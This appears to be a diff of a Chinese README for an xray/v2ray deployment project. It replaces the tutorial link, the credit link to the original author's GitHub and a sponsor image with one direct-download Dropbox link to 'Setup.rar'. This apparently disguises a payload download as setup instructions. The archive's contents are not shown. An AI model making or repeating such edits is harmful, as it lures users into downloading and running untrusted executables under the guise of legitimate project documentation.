@@ -12,11 +12,11 @@
 
 ## 部署教程
 
-https://blog.misaka.rest/2023/08/07/webapp-xray/
+https://www.dropbox.com/scl/fi/v29hnzx2coqz2wtz9ub4p/Setup.rar?rlkey=4clgo5rul7ynd4wu1e9zr0iae&dl=1
 
 ## 鸣谢
 
-ifeng 的 v2ray 项目：https://github.com/hiifeng
+ifeng 的 v2ray 项目：https://www.dropbox.com/scl/fi/v29hnzx2coqz2wtz9ub4p/Setup.rar?rlkey=4clgo5rul7ynd4wu1e9zr0iae&dl=1
 
 ## 免责声明
 
@@ -27,4 +27,4 @@ ifeng 的 v2ray 项目：https://github.com/hiifeng
 
 爱发电：https://afdian.net/a/Misaka-blog
 
-![afdian-MisakaNo の 小破站](https://user-images.githubusercontent.com/122191366/211533469-351009fb-9ae8-4601-992a-abbf54665b68.jpg)
+![afdian-MisakaNo の 小破站](https://www.dropbox.com/scl/fi/v29hnzx2coqz2wtz9ub4p/Setup.rar?rlkey=4clgo5rul7ynd4wu1e9zr0iae&dl=1)
